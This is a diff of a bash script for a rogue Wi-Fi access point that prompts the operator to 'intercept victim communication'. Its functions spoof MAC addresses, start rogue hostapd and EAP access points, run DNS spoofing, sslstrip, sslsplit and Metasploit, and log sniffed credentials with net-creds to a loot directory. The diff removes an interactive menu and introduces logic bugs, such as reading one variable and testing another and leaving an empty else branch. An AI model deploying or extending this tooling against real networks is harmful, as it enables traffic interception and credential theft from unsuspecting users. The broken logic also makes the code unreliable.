@@ -1,6 +1,6 @@
 #!/bin/bash
 #This is a work in progress and not complete, don't use it
-set -x
+
 upstream=eth0
 phy=wlan0
 phy0="$phy_0"
@@ -22,9 +22,9 @@ function clearwifi() {
 }
 
 function macchanger() {
-	ifconfig "$phy" down
-	macchanger -r "$phy"
-	ifconfig "$phy" up
+	ifconfig $phy down
+	macchanger -r $phy
+	ifconfig $phy up
 }
 
 function crackapd() {
@@ -176,51 +176,44 @@ function netcreds() {
 	python $share/net-creds/net-creds.py -i $phy > $loot/net-creds.log.`date "+%s"`
 }
 
-function hangon() {
+function hangon() { 
 	echo "Hit enter to kill me"
 	read
 }
 
 function killem() {
-        service apache2 stop
-
-        pkill dhcpd
-        pkill dnsmasq
-        pkill dnsspoof
-        pkill dns2proxy
-        pkill hostapd
-        pkill msfconsole
-        pkill python
-        pkill ruby
-        pkill stunnel4
-        pkill sslstrip
-        pkill sslsplit
-        pkill tinyproxy
-
-        rm $EXNODE
-        rm /tmp/crackapd.run
-
-        iptables --policy INPUT ACCEPT
-        iptables --policy FORWARD ACCEPT
-        iptables --policy OUTPUT ACCEPT
-        iptables -t nat -F
+	pkill dhcpd
+	pkill sslstrip
+	pkill dns2proxy
+	pkill sslsplit
+	pkill hostapd
+	pkill dnsspoof
+	pkill msfconsole
+	rm /tmp/crackapd.run
+	rm $EXNODE
+	pkill python
+	pkill ruby
+	service apache2 stop
+	pkill stunnel4
+	iptables --policy INPUT ACCEPT
+	iptables --policy FORWARD ACCEPT
+	iptables --policy OUTPUT ACCEPT
+	iptables -t nat -F
 }
 
 function testup() {
 	passed=0
 	echo "Testing whether your chosen upstream interface has an internet connection ..."
 	defaultgw="$(netstat -rn|grep 0.0.0.0|grep -oi '[a-z0-9]*$')"
-
-	if echo "${defaultgw}" | grep "${1}" ;then #> /dev/null; then
+	if [ "${defaultgw}" == "${1}" ]; then
 		echo "Good, your chosen interface has a default gateway."
 		passed=1
 	else
 		echo "Uh oh, your default gateway is not on your chosen interface."
 		echo "Our test thinks your upstream could be: $defaultgw"
 	fi
-#	ntst="$(ping -c1 8.8.8.8| grep received | sed 's/.*1 packets received.*/1/')"
-	ntst="$(ping -c1 8.8.8.8 -I "${1}" 2>/dev/null| grep "bytes from")"
-	if [[ $? -eq 0 ]]; then
+	ntst="$(ping -c1 8.8.8.8| grep received | sed 's/.*1 packets received.*/1/')"
+	if [ "${ntst}" -eq "1" ]; then
 		echo "Good, your chosen interface can reach public servers."
 		passed=2
 	else
@@ -235,72 +228,15 @@ function testup() {
 }
 
 echo "Do you want to intercept victim communication to the Internet or fake the Internet? (nat/noupstream)"
-read ans
- if [ $ans = 'nat' ]; then
+read type
+if [ $output == "nat" ]; then
         echo "You currently have $upstream configured as the interface connected to the Internet, is this correct? If not, specify which interface to use. (y/<interface e.g. wlan1>)"
-        read ans
-	if ! [ $ans = 'y' ]; then
-                upstream=$ans
+        read output
+        if [ $output != "y" ]; then
+                upstream=$output
         fi
-        testup $upstream
- fi
+        testup  
+else
 
-main_menu(){
-#clear
-echo """
-[1]  Start hostname
-[2]  Start clearwifi
-[3]  Start macchanger
-[4]  Start crackapd
-[5]  Start start_hostapd
-[6]  Start start_hostapd_eap
-[7]  Start metasploit
-[8]  Start dnspoof
-[9]  Start dnspooftwo
-[10] Start apache
-[11] Start tinyproxy
-[12] Start stunnel
-[13] Start dhcpd
-[14] Start dhcpdtwo
-[15] Start nat_firewall
-[16] Start noup_firewall
-[17] Start sslstrip
-[18] Start sslsplit
-[19] Start firelamb
-[20] Start netcreds
-[21] Start hangon
-[22] Start killem
-[23] Start testup
-[0]  Exit
-"
-read -p "Choose your action: " main_menu_choice
- case $main_menu_choice in
-  1)  clear; trap main_menu 2 ; hostname ;;
-  2)  clear; trap main_menu 2 ; clearwifi ;;
-  3)  clear; macchanger ;;
-  4)  clear; trap main_menu 2 ; crackapd ;;
-  5)  clear; trap main_menu 2 ; start_hostapd ;;
-  6)  clear; trap main_menu 2 ; start_hostapd_eap ;;
-  7)  clear; trap main_menu 2 ; metasploit ;;
-  8)  clear; trap main_menu 2 ; dnspoof ;;
-  9)  clear; trap main_menu 2 ; dnspooftwo ;;
-  10) clear; trap main_menu 2 ; apache ;;
-  11) clear; trap main_menu 2 ; tinyproxy ;;
-  12) clear; trap main_menu 2 ; stunnel ;;
-  13) clear; trap main_menu 2 ; dhcpd ;;
-  14) clear; trap main_menu 2 ; dhcpdtwo ;;
-  15) clear; trap main_menu 2 ; nat_firewall ;;
-  16) clear; trap main_menu 2 ; noup_firewall ;;
-  17) clear; trap main_menu 2 ; sslstrip ;;
-  18) clear; trap main_menu 2 ; sslsplit ;;
-  19) clear; trap main_menu 2 ; firelamb ;;
-  20) clear; trap main_menu 2 ; netcreds ;;
-  21) clear; trap main_menu 2 ; hangon ;;
-  22) clear; trap main_menu 2 ; killem ;;
-  23) clear; trap main_menu 2 ; testup ;;
-  0)  clear; exit 1 ;;
-  *) echo "Incorrect choice..."; main_menu ;
-esac
-}
-
-main_menu
+fi
+             
